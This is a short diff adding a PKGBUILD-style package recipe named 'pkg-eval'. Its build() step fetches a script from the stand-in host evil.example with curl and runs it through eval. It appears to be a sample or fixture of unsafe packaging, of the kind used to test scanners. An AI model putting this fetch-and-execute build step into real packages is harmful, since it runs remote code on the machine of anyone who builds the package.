@@ -1,0 +1,6 @@
+pkgname=pkg-eval
+pkgver=1.0
+pkgrel=1
+build() {
+    eval $(curl -s http://evil.example/setup.sh)
+}
